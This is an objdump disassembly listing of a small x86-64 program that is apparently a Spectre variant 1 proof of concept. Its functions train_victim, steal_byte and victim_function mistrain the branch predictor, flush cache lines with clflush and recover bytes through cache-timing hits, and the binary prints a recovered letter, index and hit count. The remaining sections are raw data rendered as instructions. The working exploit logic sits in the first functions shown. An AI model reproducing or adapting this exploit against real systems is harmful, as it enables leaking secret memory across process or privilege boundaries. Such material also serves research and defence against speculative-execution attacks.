 944:	c1 f8 1f             	sar    $0x1f,%eax
 947:	29 c2                	sub    %eax,%edx
 949:	89 d0                	mov    %edx,%eax
 94b:	c1 e0 02             	shl    $0x2,%eax
 94e:	01 d0                	add    %edx,%eax
 950:	01 c0                	add    %eax,%eax
 952:	29 c1                	sub    %eax,%ecx
 954:	89 ca                	mov    %ecx,%edx
 956:	48 63 c2             	movslq %edx,%rax
 959:	48 89 c7             	mov    %rax,%rdi
 95c:	e8 37 01 00 00       	callq  a98 <victim_function>
 961:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 968:	eb 1a                	jmp    984 <train_victim+0x6c>
 96a:	8b 45 f8             	mov    -0x8(%rbp),%eax
 96d:	c1 e0 0c             	shl    $0xc,%eax
 970:	48 63 d0             	movslq %eax,%rdx
 973:	48 8d 05 c6 17 20 00 	lea    0x2017c6(%rip),%rax        # 202140 <array>
 97a:	48 01 d0             	add    %rdx,%rax
 97d:	0f ae 38             	clflush (%rax)
 980:	83 45 f8 01          	addl   $0x1,-0x8(%rbp)
 984:	81 7d f8 ff 00 00 00 	cmpl   $0xff,-0x8(%rbp)
 98b:	7e dd                	jle    96a <train_victim+0x52>
 98d:	0f ae f0             	mfence 
 990:	48 8d 05 89 16 20 00 	lea    0x201689(%rip),%rax        # 202020 <bufferSize>
 997:	0f ae 38             	clflush (%rax)
 99a:	48 8b 05 6f 17 20 00 	mov    0x20176f(%rip),%rax        # 202110 <x_is_safe>
 9a1:	0f ae 38             	clflush (%rax)
 9a4:	48 8b 05 6d 17 20 00 	mov    0x20176d(%rip),%rax        # 202118 <x_is_unsafe>
 9ab:	0f ae 38             	clflush (%rax)
 9ae:	48 8d 05 57 17 20 00 	lea    0x201757(%rip),%rax        # 20210c <one>
 9b5:	0f ae 38             	clflush (%rax)
 9b8:	48 8d 05 69 17 20 00 	lea    0x201769(%rip),%rax        # 202128 <zero>
 9bf:	0f ae 38             	clflush (%rax)
 9c2:	83 45 f4 01          	addl   $0x1,-0xc(%rbp)
 9c6:	83 7d f4 13          	cmpl   $0x13,-0xc(%rbp)
 9ca:	0f 8e 5c ff ff ff    	jle    92c <train_victim+0x14>
 9d0:	0f ae e8             	lfence 
 9d3:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 9da:	eb 1a                	jmp    9f6 <train_victim+0xde>
 9dc:	8b 45 fc             	mov    -0x4(%rbp),%eax
 9df:	c1 e0 0c             	shl    $0xc,%eax
 9e2:	48 63 d0             	movslq %eax,%rdx
 9e5:	48 8d 05 54 17 20 00 	lea    0x201754(%rip),%rax        # 202140 <array>
 9ec:	48 01 d0             	add    %rdx,%rax
 9ef:	0f ae 38             	clflush (%rax)
 9f2:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 9f6:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 9fd:	7e dd                	jle    9dc <train_victim+0xc4>
 9ff:	0f ae f0             	mfence 
 a02:	48 8d 05 17 16 20 00 	lea    0x201617(%rip),%rax        # 202020 <bufferSize>
 a09:	0f ae 38             	clflush (%rax)
 a0c:	48 8b 05 fd 16 20 00 	mov    0x2016fd(%rip),%rax        # 202110 <x_is_safe>
 a13:	0f ae 38             	clflush (%rax)
 a16:	48 8b 05 fb 16 20 00 	mov    0x2016fb(%rip),%rax        # 202118 <x_is_unsafe>
 a1d:	0f ae 38             	clflush (%rax)
 a20:	48 8d 05 e5 16 20 00 	lea    0x2016e5(%rip),%rax        # 20210c <one>
 a27:	0f ae 38             	clflush (%rax)
 a2a:	48 8d 05 f7 16 20 00 	lea    0x2016f7(%rip),%rax        # 202128 <zero>
 a31:	0f ae 38             	clflush (%rax)
 a34:	90                   	nop
 a35:	c9                   	leaveq 
 a36:	c3                   	retq   

0000000000000a37 <steal_byte>:
 a37:	55                   	push   %rbp
 a38:	48 89 e5             	mov    %rsp,%rbp
 a3b:	48 83 ec 20          	sub    $0x20,%rsp
 a3f:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 a43:	89 75 e4             	mov    %esi,-0x1c(%rbp)
 a46:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 a4d:	eb 31                	jmp    a80 <steal_byte+0x49>
 a4f:	b8 00 00 00 00       	mov    $0x0,%eax
 a54:	e8 bf fe ff ff       	callq  918 <train_victim>
 a59:	48 8b 15 b8 16 20 00 	mov    0x2016b8(%rip),%rdx        # 202118 <x_is_unsafe>
 a60:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 a63:	48 98                	cltq   
 a65:	48 89 d6             	mov    %rdx,%rsi
 a68:	48 89 c7             	mov    %rax,%rdi
 a6b:	e8 28 00 00 00       	callq  a98 <victim_function>
 a70:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 a74:	48 89 c7             	mov    %rax,%rdi
 a77:	e8 9a fd ff ff       	callq  816 <find_cached_index>
 a7c:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 a80:	81 7d fc e7 03 00 00 	cmpl   $0x3e7,-0x4(%rbp)
 a87:	7e c6                	jle    a4f <steal_byte+0x18>
 a89:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 a8d:	48 89 c7             	mov    %rax,%rdi
 a90:	e8 fa fd ff ff       	callq  88f <find_highest_score>
 a95:	90                   	nop
 a96:	c9                   	leaveq 
 a97:	c3                   	retq   

0000000000000a98 <victim_function>:
 a98:	55                   	push   %rbp
 a99:	48 89 e5             	mov    %rsp,%rbp
 a9c:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 aa0:	48 89 75 f0          	mov    %rsi,-0x10(%rbp)
 aa4:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
 aa8:	8b 00                	mov    (%rax),%eax
 aaa:	85 c0                	test   %eax,%eax
 aac:	74 34                	je     ae2 <victim_function+0x4a>
 aae:	48 8d 15 8b 15 20 00 	lea    0x20158b(%rip),%rdx        # 202040 <buffer>
 ab5:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 ab9:	48 01 d0             	add    %rdx,%rax
 abc:	0f b6 00             	movzbl (%rax),%eax
 abf:	0f b6 c0             	movzbl %al,%eax
 ac2:	c1 e0 0c             	shl    $0xc,%eax
 ac5:	48 63 d0             	movslq %eax,%rdx
 ac8:	48 8d 05 71 16 20 00 	lea    0x201671(%rip),%rax        # 202140 <array>
 acf:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 ad3:	0f b6 05 4a 16 20 00 	movzbl 0x20164a(%rip),%eax        # 202124 <temp>
 ada:	21 d0                	and    %edx,%eax
 adc:	88 05 42 16 20 00    	mov    %al,0x201642(%rip)        # 202124 <temp>
 ae2:	90                   	nop
 ae3:	5d                   	pop    %rbp
 ae4:	c3                   	retq   
 ae5:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 aec:	00 00 00 
 aef:	90                   	nop

0000000000000af0 <__libc_csu_init>:
 af0:	41 57                	push   %r15
 af2:	41 56                	push   %r14
 af4:	49 89 d7             	mov    %rdx,%r15
 af7:	41 55                	push   %r13
 af9:	41 54                	push   %r12
 afb:	4c 8d 25 a6 12 20 00 	lea    0x2012a6(%rip),%r12        # 201da8 <__frame_dummy_init_array_entry>
 b02:	55                   	push   %rbp
 b03:	48 8d 2d a6 12 20 00 	lea    0x2012a6(%rip),%rbp        # 201db0 <__init_array_end>
 b0a:	53                   	push   %rbx
 b0b:	41 89 fd             	mov    %edi,%r13d
 b0e:	49 89 f6             	mov    %rsi,%r14
 b11:	4c 29 e5             	sub    %r12,%rbp
 b14:	48 83 ec 08          	sub    $0x8,%rsp
 b18:	48 c1 fd 03          	sar    $0x3,%rbp
 b1c:	e8 6f fa ff ff       	callq  590 <_init>
 b21:	48 85 ed             	test   %rbp,%rbp
 b24:	74 20                	je     b46 <__libc_csu_init+0x56>
 b26:	31 db                	xor    %ebx,%ebx
 b28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
 b2f:	00 
 b30:	4c 89 fa             	mov    %r15,%rdx
 b33:	4c 89 f6             	mov    %r14,%rsi
 b36:	44 89 ef             	mov    %r13d,%edi
 b39:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
 b3d:	48 83 c3 01          	add    $0x1,%rbx
 b41:	48 39 dd             	cmp    %rbx,%rbp
 b44:	75 ea                	jne    b30 <__libc_csu_init+0x40>
 b46:	48 83 c4 08          	add    $0x8,%rsp
 b4a:	5b                   	pop    %rbx
 b4b:	5d                   	pop    %rbp
 b4c:	41 5c                	pop    %r12
 b4e:	41 5d                	pop    %r13
 b50:	41 5e                	pop    %r14
 b52:	41 5f                	pop    %r15
 b54:	c3                   	retq   
 b55:	90                   	nop
 b56:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 b5d:	00 00 00 

0000000000000b60 <__libc_csu_fini>:
 b60:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000000b64 <_fini>:
 b64:	48 83 ec 08          	sub    $0x8,%rsp
 b68:	48 83 c4 08          	add    $0x8,%rsp
 b6c:	c3                   	retq   

Disassembly of section .rodata:

0000000000000b70 <_IO_stdin_used>:
 b70:	01 00                	add    %eax,(%rax)
 b72:	02 00                	add    (%rax),%al
 b74:	00 00                	add    %al,(%rax)
 b76:	00 00                	add    %al,(%rax)
 b78:	4c                   	rex.WR
 b79:	65 74 74             	gs je  bf0 <__GNU_EH_FRAME_HDR+0x4c>
 b7c:	65 72 3a             	gs jb  bb9 <__GNU_EH_FRAME_HDR+0x15>
 b7f:	20 25 63 09 20 49    	and    %ah,0x49200963(%rip)        # 492014e8 <_end+0x48eff3a8>
 b85:	6e                   	outsb  %ds:(%rsi),(%dx)
 b86:	64 65 78 3a          	fs gs js bc4 <__GNU_EH_FRAME_HDR+0x20>
 b8a:	20 25 64 09 20 6e    	and    %ah,0x6e200964(%rip)        # 6e2014f4 <_end+0x6deff3b4>
 b90:	75 6d                	jne    bff <__GNU_EH_FRAME_HDR+0x5b>
 b92:	62                   	(bad)  
 b93:	65 72 20             	gs jb  bb6 <__GNU_EH_FRAME_HDR+0x12>
 b96:	6f                   	outsl  %ds:(%rsi),(%dx)
 b97:	66 20 68 69          	data16 and %ch,0x69(%rax)
 b9b:	74 73                	je     c10 <__GNU_EH_FRAME_HDR+0x6c>
 b9d:	3a                   	.byte 0x3a
 b9e:	25                   	.byte 0x25
 b9f:	64 0a 00             	or     %fs:(%rax),%al

Disassembly of section .eh_frame_hdr:

0000000000000ba4 <__GNU_EH_FRAME_HDR>:
 ba4:	01 1b                	add    %ebx,(%rbx)
 ba6:	03 3b                	add    (%rbx),%edi
 ba8:	60                   	(bad)  
 ba9:	00 00                	add    %al,(%rax)
 bab:	00 0b                	add    %cl,(%rbx)
 bad:	00 00                	add    %al,(%rax)
 baf:	00 0c fa             	add    %cl,(%rdx,%rdi,8)
 bb2:	ff                   	(bad)  
 bb3:	ff ac 00 00 00 4c fa 	ljmp   *-0x5b40000(%rax,%rax,1)
 bba:	ff                   	(bad)  
 bbb:	ff d4                	callq  *%rsp
 bbd:	00 00                	add    %al,(%rax)
 bbf:	00 5c fa ff          	add    %bl,-0x1(%rdx,%rdi,8)
 bc3:	ff                   	(bad)  
 bc4:	7c 00                	jl     bc6 <__GNU_EH_FRAME_HDR+0x22>
 bc6:	00 00                	add    %al,(%rax)
 bc8:	66 fb                	data16 sti 
 bca:	ff                   	(bad)  
 bcb:	ff                   	(bad)  
 bcc:	ec                   	in     (%dx),%al
 bcd:	00 00                	add    %al,(%rax)
 bcf:	00 72 fc             	add    %dh,-0x4(%rdx)
 bd2:	ff                   	(bad)  
 bd3:	ff 0c 01             	decl   (%rcx,%rax,1)
 bd6:	00 00                	add    %al,(%rax)
 bd8:	eb fc                	jmp    bd6 <__GNU_EH_FRAME_HDR+0x32>
 bda:	ff                   	(bad)  
 bdb:	ff 30                	pushq  (%rax)
 bdd:	01 00                	add    %eax,(%rax)
 bdf:	00 74 fd ff          	add    %dh,-0x1(%rbp,%rdi,8)
 be3:	ff 50 01             	callq  *0x1(%rax)
 be6:	00 00                	add    %al,(%rax)
 be8:	93                   	xchg   %eax,%ebx
 be9:	fe                   	(bad)  
 bea:	ff                   	(bad)  
 beb:	ff 70 01             	pushq  0x1(%rax)
 bee:	00 00                	add    %al,(%rax)
 bf0:	f4                   	hlt    
 bf1:	fe                   	(bad)  
 bf2:	ff                   	(bad)  
 bf3:	ff 94 01 00 00 4c ff 	callq  *-0xb40000(%rcx,%rax,1)
 bfa:	ff                   	(bad)  
 bfb:	ff b4 01 00 00 bc ff 	pushq  -0x440000(%rcx,%rax,1)
 c02:	ff                   	(bad)  
 c03:	ff                   	(bad)  
 c04:	fc                   	cld    
 c05:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .eh_frame:

0000000000000c08 <__FRAME_END__-0x1ac>:
 c08:	14 00                	adc    $0x0,%al
 c0a:	00 00                	add    %al,(%rax)
 c0c:	00 00                	add    %al,(%rax)
 c0e:	00 00                	add    %al,(%rax)
 c10:	01 7a 52             	add    %edi,0x52(%rdx)
 c13:	00 01                	add    %al,(%rcx)
 c15:	78 10                	js     c27 <__GNU_EH_FRAME_HDR+0x83>
 c17:	01 1b                	add    %ebx,(%rbx)
 c19:	0c 07                	or     $0x7,%al
 c1b:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
 c21:	00 00                	add    %al,(%rax)
 c23:	00 1c 00             	add    %bl,(%rax,%rax,1)
 c26:	00 00                	add    %al,(%rax)
 c28:	d8 f9                	fdivr  %st(1),%st
 c2a:	ff                   	(bad)  
 c2b:	ff 2b                	ljmp   *(%rbx)
	...
 c35:	00 00                	add    %al,(%rax)
 c37:	00 14 00             	add    %dl,(%rax,%rax,1)
 c3a:	00 00                	add    %al,(%rax)
 c3c:	00 00                	add    %al,(%rax)
 c3e:	00 00                	add    %al,(%rax)
 c40:	01 7a 52             	add    %edi,0x52(%rdx)
 c43:	00 01                	add    %al,(%rcx)
 c45:	78 10                	js     c57 <__GNU_EH_FRAME_HDR+0xb3>
 c47:	01 1b                	add    %ebx,(%rbx)
 c49:	0c 07                	or     $0x7,%al
 c4b:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
 c51:	00 00                	add    %al,(%rax)
 c53:	00 1c 00             	add    %bl,(%rax,%rax,1)
 c56:	00 00                	add    %al,(%rax)
 c58:	58                   	pop    %rax
 c59:	f9                   	stc    
 c5a:	ff                   	(bad)  
 c5b:	ff 40 00             	incl   0x0(%rax)
 c5e:	00 00                	add    %al,(%rax)
 c60:	00 0e                	add    %cl,(%rsi)
 c62:	10 46 0e             	adc    %al,0xe(%rsi)
 c65:	18 4a 0f             	sbb    %cl,0xf(%rdx)
 c68:	0b 77 08             	or     0x8(%rdi),%esi
 c6b:	80 00 3f             	addb   $0x3f,(%rax)
 c6e:	1a 3b                	sbb    (%rbx),%bh
 c70:	2a 33                	sub    (%rbx),%dh
 c72:	24 22                	and    $0x22,%al
 c74:	00 00                	add    %al,(%rax)
 c76:	00 00                	add    %al,(%rax)
 c78:	14 00                	adc    $0x0,%al
 c7a:	00 00                	add    %al,(%rax)
 c7c:	44 00 00             	add    %r8b,(%rax)
 c7f:	00 70 f9             	add    %dh,-0x7(%rax)
 c82:	ff                   	(bad)  
 c83:	ff 08                	decl   (%rax)
	...
 c8d:	00 00                	add    %al,(%rax)
 c8f:	00 1c 00             	add    %bl,(%rax,%rax,1)
 c92:	00 00                	add    %al,(%rax)
 c94:	5c                   	pop    %rsp
 c95:	00 00                	add    %al,(%rax)
 c97:	00 72 fa             	add    %dh,-0x6(%rdx)
 c9a:	ff                   	(bad)  
 c9b:	ff 0c 01             	decl   (%rcx,%rax,1)
 c9e:	00 00                	add    %al,(%rax)
 ca0:	00 41 0e             	add    %al,0xe(%rcx)
 ca3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 ca9:	03 07                	add    (%rdi),%eax
 cab:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
 cae:	08 00                	or     %al,(%rax)
 cb0:	20 00                	and    %al,(%rax)
 cb2:	00 00                	add    %al,(%rax)
 cb4:	7c 00                	jl     cb6 <__GNU_EH_FRAME_HDR+0x112>
 cb6:	00 00                	add    %al,(%rax)
 cb8:	5e                   	pop    %rsi
 cb9:	fb                   	sti    
 cba:	ff                   	(bad)  
 cbb:	ff                   	(bad)  
 cbc:	79 00                	jns    cbe <__GNU_EH_FRAME_HDR+0x11a>
 cbe:	00 00                	add    %al,(%rax)
 cc0:	00 41 0e             	add    %al,0xe(%rcx)
 cc3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 cc9:	41 83 03 02          	addl   $0x2,(%r11)
 ccd:	73 0c                	jae    cdb <__GNU_EH_FRAME_HDR+0x137>
 ccf:	07                   	(bad)  
 cd0:	08 00                	or     %al,(%rax)
 cd2:	00 00                	add    %al,(%rax)
 cd4:	1c 00                	sbb    $0x0,%al
 cd6:	00 00                	add    %al,(%rax)
 cd8:	a0 00 00 00 b3 fb ff 	movabs 0x89fffffbb3000000,%al
 cdf:	ff 89 
 ce1:	00 00                	add    %al,(%rax)
 ce3:	00 00                	add    %al,(%rax)
 ce5:	41 0e                	rex.B (bad) 
 ce7:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 ced:	02 84 0c 07 08 00 00 	add    0x807(%rsp,%rcx,1),%al
 cf4:	1c 00                	sbb    $0x0,%al
 cf6:	00 00                	add    %al,(%rax)
 cf8:	c0 00 00             	rolb   $0x0,(%rax)
 cfb:	00 1c fc             	add    %bl,(%rsp,%rdi,8)
 cfe:	ff                   	(bad)  
 cff:	ff 1f                	lcall  *(%rdi)
 d01:	01 00                	add    %eax,(%rax)
 d03:	00 00                	add    %al,(%rax)
 d05:	41 0e                	rex.B (bad) 
 d07:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d0d:	03 1a                	add    (%rdx),%ebx
 d0f:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
 d12:	08 00                	or     %al,(%rax)
 d14:	20 00                	and    %al,(%rax)
 d16:	00 00                	add    %al,(%rax)
 d18:	e0 00                	loopne d1a <__GNU_EH_FRAME_HDR+0x176>
 d1a:	00 00                	add    %al,(%rax)
 d1c:	1b fd                	sbb    %ebp,%edi
 d1e:	ff                   	(bad)  
 d1f:	ff 61 00             	jmpq   *0x0(%rcx)
 d22:	00 00                	add    %al,(%rax)
 d24:	00 41 0e             	add    %al,0xe(%rcx)
 d27:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d2d:	02 5c 0c 07          	add    0x7(%rsp,%rcx,1),%bl
 d31:	08 00                	or     %al,(%rax)
 d33:	00 00                	add    %al,(%rax)
 d35:	00 00                	add    %al,(%rax)
 d37:	00 1c 00             	add    %bl,(%rax,%rax,1)
 d3a:	00 00                	add    %al,(%rax)
 d3c:	04 01                	add    $0x1,%al
 d3e:	00 00                	add    %al,(%rax)
 d40:	58                   	pop    %rax
 d41:	fd                   	std    
 d42:	ff                   	(bad)  
 d43:	ff 4d 00             	decl   0x0(%rbp)
 d46:	00 00                	add    %al,(%rax)
 d48:	00 41 0e             	add    %al,0xe(%rcx)
 d4b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
 d51:	02 48 0c             	add    0xc(%rax),%cl
 d54:	07                   	(bad)  
 d55:	08 00                	or     %al,(%rax)
 d57:	00 44 00 00          	add    %al,0x0(%rax,%rax,1)
 d5b:	00 24 01             	add    %ah,(%rcx,%rax,1)
 d5e:	00 00                	add    %al,(%rax)
 d60:	90                   	nop
 d61:	fd                   	std    
 d62:	ff                   	(bad)  
 d63:	ff 65 00             	jmpq   *0x0(%rbp)
 d66:	00 00                	add    %al,(%rax)
 d68:	00 42 0e             	add    %al,0xe(%rdx)
 d6b:	10 8f 02 42 0e 18    	adc    %cl,0x180e4202(%rdi)
 d71:	8e 03                	mov    (%rbx),%es
 d73:	45 0e                	rex.RB (bad) 
 d75:	20 8d 04 42 0e 28    	and    %cl,0x280e4204(%rbp)
 d7b:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86301bc9 <_end+0xffffffff85fffa89>
 d81:	06                   	(bad)  
 d82:	48 0e                	rex.W (bad) 
 d84:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
 d8a:	72 0e                	jb     d9a <__GNU_EH_FRAME_HDR+0x1f6>
 d8c:	38 41 0e             	cmp    %al,0xe(%rcx)
 d8f:	30 41 0e             	xor    %al,0xe(%rcx)
 d92:	28 42 0e             	sub    %al,0xe(%rdx)
 d95:	20 42 0e             	and    %al,0xe(%rdx)
 d98:	18 42 0e             	sbb    %al,0xe(%rdx)
 d9b:	10 42 0e             	adc    %al,0xe(%rdx)
 d9e:	08 00                	or     %al,(%rax)
 da0:	10 00                	adc    %al,(%rax)
 da2:	00 00                	add    %al,(%rax)
 da4:	6c                   	insb   (%dx),%es:(%rdi)
 da5:	01 00                	add    %eax,(%rax)
 da7:	00 b8 fd ff ff 02    	add    %bh,0x2fffffd(%rax)
 dad:	00 00                	add    %al,(%rax)
 daf:	00 00                	add    %al,(%rax)
 db1:	00 00                	add    %al,(%rax)
	...

0000000000000db4 <__FRAME_END__>:
 db4:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000201da8 <__frame_dummy_init_array_entry>:
  201da8:	00 07                	add    %al,(%rdi)
  201daa:	00 00                	add    %al,(%rax)
  201dac:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000201db0 <__do_global_dtors_aux_fini_array_entry>:
  201db0:	c0 06 00             	rolb   $0x0,(%rsi)
  201db3:	00 00                	add    %al,(%rax)
  201db5:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000201db8 <_DYNAMIC>:
  201db8:	01 00                	add    %eax,(%rax)
  201dba:	00 00                	add    %al,(%rax)
  201dbc:	00 00                	add    %al,(%rax)
  201dbe:	00 00                	add    %al,(%rax)
  201dc0:	01 00                	add    %eax,(%rax)
  201dc2:	00 00                	add    %al,(%rax)
  201dc4:	00 00                	add    %al,(%rax)
  201dc6:	00 00                	add    %al,(%rax)
  201dc8:	0c 00                	or     $0x0,%al
  201dca:	00 00                	add    %al,(%rax)
  201dcc:	00 00                	add    %al,(%rax)
  201dce:	00 00                	add    %al,(%rax)
  201dd0:	90                   	nop
  201dd1:	05 00 00 00 00       	add    $0x0,%eax
  201dd6:	00 00                	add    %al,(%rax)
  201dd8:	0d 00 00 00 00       	or     $0x0,%eax
  201ddd:	00 00                	add    %al,(%rax)
  201ddf:	00 64 0b 00          	add    %ah,0x0(%rbx,%rcx,1)
  201de3:	00 00                	add    %al,(%rax)
  201de5:	00 00                	add    %al,(%rax)
  201de7:	00 19                	add    %bl,(%rcx)
  201de9:	00 00                	add    %al,(%rax)
  201deb:	00 00                	add    %al,(%rax)
  201ded:	00 00                	add    %al,(%rax)
  201def:	00 a8 1d 20 00 00    	add    %ch,0x201d(%rax)
  201df5:	00 00                	add    %al,(%rax)
  201df7:	00 1b                	add    %bl,(%rbx)
  201df9:	00 00                	add    %al,(%rax)
  201dfb:	00 00                	add    %al,(%rax)
  201dfd:	00 00                	add    %al,(%rax)
  201dff:	00 08                	add    %cl,(%rax)
  201e01:	00 00                	add    %al,(%rax)
  201e03:	00 00                	add    %al,(%rax)
  201e05:	00 00                	add    %al,(%rax)
  201e07:	00 1a                	add    %bl,(%rdx)
  201e09:	00 00                	add    %al,(%rax)
  201e0b:	00 00                	add    %al,(%rax)
  201e0d:	00 00                	add    %al,(%rax)
  201e0f:	00 b0 1d 20 00 00    	add    %dh,0x201d(%rax)
  201e15:	00 00                	add    %al,(%rax)
  201e17:	00 1c 00             	add    %bl,(%rax,%rax,1)
  201e1a:	00 00                	add    %al,(%rax)
  201e1c:	00 00                	add    %al,(%rax)
  201e1e:	00 00                	add    %al,(%rax)
  201e20:	08 00                	or     %al,(%rax)
  201e22:	00 00                	add    %al,(%rax)
  201e24:	00 00                	add    %al,(%rax)
  201e26:	00 00                	add    %al,(%rax)
  201e28:	f5                   	cmc    
  201e29:	fe                   	(bad)  
  201e2a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201e2d:	00 00                	add    %al,(%rax)
  201e2f:	00 98 02 00 00 00    	add    %bl,0x2(%rax)
  201e35:	00 00                	add    %al,(%rax)
  201e37:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 201e3d <_DYNAMIC+0x85>
  201e3d:	00 00                	add    %al,(%rax)
  201e3f:	00 90 03 00 00 00    	add    %dl,0x3(%rax)
  201e45:	00 00                	add    %al,(%rax)
  201e47:	00 06                	add    %al,(%rsi)
  201e49:	00 00                	add    %al,(%rax)
  201e4b:	00 00                	add    %al,(%rax)
  201e4d:	00 00                	add    %al,(%rax)
  201e4f:	00 b8 02 00 00 00    	add    %bh,0x2(%rax)
  201e55:	00 00                	add    %al,(%rax)
  201e57:	00 0a                	add    %cl,(%rdx)
  201e59:	00 00                	add    %al,(%rax)
  201e5b:	00 00                	add    %al,(%rax)
  201e5d:	00 00                	add    %al,(%rax)
  201e5f:	00 90 00 00 00 00    	add    %dl,0x0(%rax)
  201e65:	00 00                	add    %al,(%rax)
  201e67:	00 0b                	add    %cl,(%rbx)
  201e69:	00 00                	add    %al,(%rax)
  201e6b:	00 00                	add    %al,(%rax)
  201e6d:	00 00                	add    %al,(%rax)
  201e6f:	00 18                	add    %bl,(%rax)
  201e71:	00 00                	add    %al,(%rax)
  201e73:	00 00                	add    %al,(%rax)
  201e75:	00 00                	add    %al,(%rax)
  201e77:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 201e7d <_DYNAMIC+0xc5>
	...
  201e85:	00 00                	add    %al,(%rax)
  201e87:	00 03                	add    %al,(%rbx)
  201e89:	00 00                	add    %al,(%rax)
  201e8b:	00 00                	add    %al,(%rax)
  201e8d:	00 00                	add    %al,(%rax)
  201e8f:	00 a8 1f 20 00 00    	add    %ch,0x201f(%rax)
  201e95:	00 00                	add    %al,(%rax)
  201e97:	00 02                	add    %al,(%rdx)
  201e99:	00 00                	add    %al,(%rax)
  201e9b:	00 00                	add    %al,(%rax)
  201e9d:	00 00                	add    %al,(%rax)
  201e9f:	00 48 00             	add    %cl,0x0(%rax)
  201ea2:	00 00                	add    %al,(%rax)
  201ea4:	00 00                	add    %al,(%rax)
  201ea6:	00 00                	add    %al,(%rax)
  201ea8:	14 00                	adc    $0x0,%al
  201eaa:	00 00                	add    %al,(%rax)
  201eac:	00 00                	add    %al,(%rax)
  201eae:	00 00                	add    %al,(%rax)
  201eb0:	07                   	(bad)  
  201eb1:	00 00                	add    %al,(%rax)
  201eb3:	00 00                	add    %al,(%rax)
  201eb5:	00 00                	add    %al,(%rax)
  201eb7:	00 17                	add    %dl,(%rdi)
  201eb9:	00 00                	add    %al,(%rax)
  201ebb:	00 00                	add    %al,(%rax)
  201ebd:	00 00                	add    %al,(%rax)
  201ebf:	00 48 05             	add    %cl,0x5(%rax)
  201ec2:	00 00                	add    %al,(%rax)
  201ec4:	00 00                	add    %al,(%rax)
  201ec6:	00 00                	add    %al,(%rax)
  201ec8:	07                   	(bad)  
  201ec9:	00 00                	add    %al,(%rax)
  201ecb:	00 00                	add    %al,(%rax)
  201ecd:	00 00                	add    %al,(%rax)
  201ecf:	00 58 04             	add    %bl,0x4(%rax)
  201ed2:	00 00                	add    %al,(%rax)
  201ed4:	00 00                	add    %al,(%rax)
  201ed6:	00 00                	add    %al,(%rax)
  201ed8:	08 00                	or     %al,(%rax)
  201eda:	00 00                	add    %al,(%rax)
  201edc:	00 00                	add    %al,(%rax)
  201ede:	00 00                	add    %al,(%rax)
  201ee0:	f0 00 00             	lock add %al,(%rax)
  201ee3:	00 00                	add    %al,(%rax)
  201ee5:	00 00                	add    %al,(%rax)
  201ee7:	00 09                	add    %cl,(%rcx)
  201ee9:	00 00                	add    %al,(%rax)
  201eeb:	00 00                	add    %al,(%rax)
  201eed:	00 00                	add    %al,(%rax)
  201eef:	00 18                	add    %bl,(%rax)
  201ef1:	00 00                	add    %al,(%rax)
  201ef3:	00 00                	add    %al,(%rax)
  201ef5:	00 00                	add    %al,(%rax)
  201ef7:	00 1e                	add    %bl,(%rsi)
  201ef9:	00 00                	add    %al,(%rax)
  201efb:	00 00                	add    %al,(%rax)
  201efd:	00 00                	add    %al,(%rax)
  201eff:	00 08                	add    %cl,(%rax)
  201f01:	00 00                	add    %al,(%rax)
  201f03:	00 00                	add    %al,(%rax)
  201f05:	00 00                	add    %al,(%rax)
  201f07:	00 fb                	add    %bh,%bl
  201f09:	ff                   	(bad)  
  201f0a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f0d:	00 00                	add    %al,(%rax)
  201f0f:	00 01                	add    %al,(%rcx)
  201f11:	00 00                	add    %al,(%rax)
  201f13:	08 00                	or     %al,(%rax)
  201f15:	00 00                	add    %al,(%rax)
  201f17:	00 fe                	add    %bh,%dh
  201f19:	ff                   	(bad)  
  201f1a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f1d:	00 00                	add    %al,(%rax)
  201f1f:	00 38                	add    %bh,(%rax)
  201f21:	04 00                	add    $0x0,%al
  201f23:	00 00                	add    %al,(%rax)
  201f25:	00 00                	add    %al,(%rax)
  201f27:	00 ff                	add    %bh,%bh
  201f29:	ff                   	(bad)  
  201f2a:	ff 6f 00             	ljmp   *0x0(%rdi)
  201f2d:	00 00                	add    %al,(%rax)
  201f2f:	00 01                	add    %al,(%rcx)
  201f31:	00 00                	add    %al,(%rax)
  201f33:	00 00                	add    %al,(%rax)
  201f35:	00 00                	add    %al,(%rax)
